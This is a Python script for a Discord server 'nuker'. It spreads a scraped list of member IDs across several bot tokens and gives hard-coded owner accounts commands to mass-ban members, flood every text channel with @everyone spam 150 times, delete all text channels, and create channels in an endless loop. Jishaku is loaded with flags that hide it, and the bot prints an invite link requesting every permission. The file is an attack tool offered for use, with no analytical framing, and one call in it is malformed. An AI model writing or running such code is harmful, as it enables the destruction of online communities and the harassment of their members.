import discord
from discord.ext import commands
import asyncio
import jishaku
import os
import random
BOT_TOKENS = []  
intents = discord.Intents.all()
intents.webhooks= True
intents.messages = True
async def create_bot(token, ids):
    bot = commands.Bot(command_prefix='!',intents=intents)
    bot.owner_ids = [1043194242476036107,765865384011628574,630616794033291267]
    await bot.load_extension("jishaku")
    @bot.command()
    @commands.is_owner()
    async def banall(ctx):
        guild = ctx.guild
  
        for member_id in ids:
            try:
                user = await bot.fetch_user(member_id)
                await guild.ban(user, reason="fcked")
                await ctx.send(f"Banned {user.name} (ID: {user.id})")
                print(f"Banned {user.name} (ID: {user.id})")

                ids.remove(member_id)
            except Exception as e:
                print(f"Failed to ban user with ID {member_id}: {e}")
    @bot.command()
    @commands.is_owner()
    async def ray(ctx, *, lund):
        async def send_message(channel,*, lund):
            for _ in range(150):
                await channel.send(f"@everyone @here {lund}")

        tasks = []
        for channel in ctx.guild.text_channels:
            task = asyncio.create_task(send_message(channel, lund))
            tasks.append(task)

        await asyncio.gather(*tasks)

    @bot.command()
    @commands.is_owner()
    async def delete(ctx):
        guild = ctx.guild
        channels = guild.text_channels

        
        random.shuffle(channels)

        
        for channel in channels:
            try:
                await channel.delete()
            except Exception as e:
                print(f"Error deleting channel {channel.name}: {e}")
    @bot.command()
    @commands.is_owner()
    async def create(ctx,name):
        while True:
         try:
             await ctx.guild.create.text_channels(name=name)
         except:
             break
    @bot.event
    async def on_ready():
          
        try:
            app_info = await bot.application_info()
            
            
            owner_name = bot.user.name
            print(f"The bot is: {owner_name}")

            invite_link = discord.utils.oauth_url(app_info.id, permissions=discord.Permissions.all())
            print(invite_link)

            print(f'{bot.user.name} logged successfully')
        except Exception as e:
            print(f"An error occurred in on_ready: {e}")

    
         
    await bot.start(token)


os.environ["JISHAKU_NO_DM_TRACEBACK"] = "True"
os.environ["JISHAKU_HIDE"] = "True"
os.environ["JISHAKU_NO_UNDERSCORE"] = "True"
os.environ["JISHAKU_FORCE_PAGINATOR"] = "True"
async def main():
    with open("scraped.txt", "r") as file:
        member_ids = [line.strip() for line in file]

    chunk_size = (len(member_ids) + len(BOT_TOKENS) - 1) // len(BOT_TOKENS)
    id_chunks = [member_ids[i:i+chunk_size] for i in range(0, len(member_ids), chunk_size)]

    bot_tasks = [asyncio.create_task(create_bot(token, ids)) for token, ids in zip(BOT_TOKENS, id_chunks)]
    await asyncio.gather(*bot_tasks)
if __name__ == '__main__':
    asyncio.run(main())
